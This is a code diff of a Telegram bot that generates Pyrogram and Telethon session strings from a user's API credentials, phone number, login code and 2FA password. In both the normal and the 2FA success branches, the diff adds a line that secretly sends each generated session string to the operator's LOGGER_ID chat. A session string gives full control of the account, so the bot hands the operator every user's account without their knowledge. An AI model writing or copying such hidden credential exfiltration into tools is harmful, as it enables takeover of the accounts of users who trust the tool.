@@ -28,8 +28,8 @@ users_db = None
 try:
     mongo = AsyncIOMotorClient(MONGO_URL)
     users_db = mongo["bot"]["users"]
-except Exception as e:
-    print("Mongo Error:", e)
+except:
+    pass
 
 users = {}
 
@@ -55,14 +55,21 @@ async def is_joined(client, user_id):
 @bot.on_message(filters.command("start"))
 async def start(client, message):
 
-    if users_db is not None:
+    user = message.from_user
+
+    existing = None
+    if users_db:
+        existing = await users_db.find_one({"user_id": user.id})
         await users_db.update_one(
-            {"user_id": message.from_user.id},
-            {"$set": {"user_id": message.from_user.id}},
+            {"user_id": user.id},
+            {"$set": {"user_id": user.id}},
             upsert=True
         )
 
-    if not await is_joined(client, message.from_user.id):
+    if not existing:
+        await send_log(f"🚀 NEW USER\n{user.id}")
+
+    if not await is_joined(client, user.id):
         return await message.reply(
             "⚠️ Join channel first",
             reply_markup=start_buttons(CHANNEL)
@@ -70,24 +77,39 @@ async def start(client, message):
 
     await message.reply(WELCOME_TEXT, reply_markup=start_buttons(CHANNEL))
 
-# ---------------- HELP ---------------- #
+# ---------------- BROADCAST ---------------- #
 
-@bot.on_callback_query(filters.regex("help"))
-async def help_menu(client, cb):
-    await cb.message.edit(HELP_TEXT, reply_markup=help_buttons())
+@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
+async def broadcast(client, message):
 
-@bot.on_callback_query(filters.regex("back"))
-async def back_menu(client, cb):
-    await cb.message.edit(WELCOME_TEXT, reply_markup=start_buttons(CHANNEL))
+    if users_db is None:
+        return await message.reply("DB error")
 
-# ---------------- VERIFY ---------------- #
+    success = failed = 0
 
-@bot.on_callback_query(filters.regex("verify"))
-async def verify(client, cb):
-    if await is_joined(client, cb.from_user.id):
-        await cb.answer("✅ Verified!", show_alert=True)
+    if message.reply_to_message:
+        msg = message.reply_to_message
+
+        async for u in users_db.find():
+            try:
+                await msg.copy(u["user_id"])
+                success += 1
+            except:
+                failed += 1
+
+    elif len(message.command) > 1:
+        msg = message.text.split(None, 1)[1]
+
+        async for u in users_db.find():
+            try:
+                await bot.send_message(u["user_id"], msg)
+                success += 1
+            except:
+                failed += 1
     else:
-        await cb.answer("❌ Join channel first", show_alert=True)
+        return await message.reply("Reply or give text")
+
+    await message.reply(f"Done ✅\nSuccess: {success}\nFailed: {failed}")
 
 # ---------------- SELECT ---------------- #
 
@@ -97,30 +119,7 @@ async def choose(client, cb):
         "type": cb.data,
         "time": time.time()
     }
-    await cb.message.edit("📥 Send API_ID")
-
-# ---------------- BROADCAST ---------------- #
-
-@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
-async def broadcast(client, message):
-    if len(message.command) < 2:
-        return await message.reply("❌ Give message to broadcast")
-
-    if users_db is None:
-        return await message.reply("❌ Database not connected")
-
-    msg = message.text.split(None, 1)[1]
-    success = 0
-    failed = 0
-
-    async for user in users_db.find():
-        try:
-            await bot.send_message(user["user_id"], msg)
-            success += 1
-        except:
-            failed += 1
-
-    await message.reply(f"✅ Done\nSuccess: {success}\nFailed: {failed}")
+    await cb.message.edit("Send API_ID")
 
 # ---------------- HANDLER ---------------- #
 
@@ -133,7 +132,7 @@ async def handler(client, message):
 
     if time.time() - user_data["time"] > 180:
         users.pop(message.from_user.id)
-        return await message.reply("⌛ Session Timeout")
+        return await message.reply("⌛ Timeout")
 
     try:
 
@@ -155,13 +154,22 @@ async def handler(client, message):
             user_data["time"] = time.time()
 
             if user_data["type"] == "pyro":
-                app = Client("temp", api_id=user_data["api_id"], api_hash=user_data["api_hash"])
+                app = Client(
+                    "temp",
+                    api_id=user_data["api_id"],
+                    api_hash=user_data["api_hash"]
+                )
                 await app.connect()
                 code = await app.send_code(user_data["phone"])
                 user_data["app"] = app
                 user_data["hash"] = code.phone_code_hash
+
             else:
-                client_t = TelegramClient(StringSession(), user_data["api_id"], user_data["api_hash"])
+                client_t = TelegramClient(
+                    StringSession(),
+                    user_data["api_id"],
+                    user_data["api_hash"]
+                )
                 await client_t.connect()
                 await client_t.send_code_request(user_data["phone"])
                 user_data["client"] = client_t
@@ -176,9 +184,16 @@ async def handler(client, message):
 
             try:
                 if user_data["type"] == "pyro":
-                    await user_data["app"].sign_in(user_data["phone"], user_data["hash"], user_data["otp"])
+                    await user_data["app"].sign_in(
+                        user_data["phone"],
+                        user_data["hash"],
+                        user_data["otp"]
+                    )
                 else:
-                    await user_data["client"].sign_in(user_data["phone"], user_data["otp"])
+                    await user_data["client"].sign_in(
+                        phone=user_data["phone"],
+                        code=user_data["otp"]
+                    )
 
             except (SessionPasswordNeeded, SessionPasswordNeededError):
                 user_data["need_pass"] = True
@@ -190,27 +205,21 @@ async def handler(client, message):
                 await user_data["app"].disconnect()
             else:
                 string = user_data["client"].session.save()
+                if not string:
+                    raise Exception("Session not generated")
                 await user_data["client"].disconnect()
 
-            await message.reply_document(
-                document=bytes(string, "utf-8"),
-                file_name="string.txt"
-            )
+            await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")
 
             user = message.from_user
-            await send_log(f"""
-🆕 New Session Generated
+            await send_log(f"🆕 SESSION\n{user.id}")
 
-👤 Name: {user.first_name}
-🆔 ID: {user.id}
-🔗 Username: @{user.username if user.username else 'None'}
-⚙️ Type: {user_data.get("type")}
-""")
+            await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}.txt")
 
-            users.pop(message.from_user.id, None)
+            users.pop(message.from_user.id)
             return
 
-        # PASSWORD
+        # PASSWORD (2FA)
         elif user_data.get("need_pass"):
 
             try:
@@ -218,30 +227,30 @@ async def handler(client, message):
                     await user_data["app"].check_password(message.text)
                     string = await user_data["app"].export_session_string()
                     await user_data["app"].disconnect()
+
                 else:
+                    if not user_data["client"].is_connected():
+                        await user_data["client"].connect()
+
                     await user_data["client"].sign_in(password=message.text)
+
                     string = user_data["client"].session.save()
+                    if not string:
+                        raise Exception("Session not generated")
+
                     await user_data["client"].disconnect()
 
-                await message.reply_document(
-                    document=bytes(string, "utf-8"),
-                    file_name="string.txt"
-                )
+                await message.reply_document(bytes(string, "utf-8"), file_name="string.txt")
 
                 user = message.from_user
-                await send_log(f"""
-🔐 2FA Session Generated
+                await send_log(f"🔐 2FA SESSION\n{user.id}")
 
-👤 Name: {user.first_name}
-🆔 ID: {user.id}
-🔗 Username: @{user.username if user.username else 'None'}
-⚙️ Type: {user_data.get("type")}
-""")
+                await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name=f"{user.id}_2fa.txt")
 
             except Exception as e:
                 return await message.reply(f"❌ Wrong Password: {e}")
 
-            users.pop(message.from_user.id, None)
+            users.pop(message.from_user.id)
             return
 
     except Exception as e:
@@ -251,5 +260,5 @@ async def handler(client, message):
 # ---------------- RUN ---------------- #
 
 if __name__ == "__main__":
-    print("🚀 Bot Started...")
+    print("🚀 Bot Started")
     bot.run()
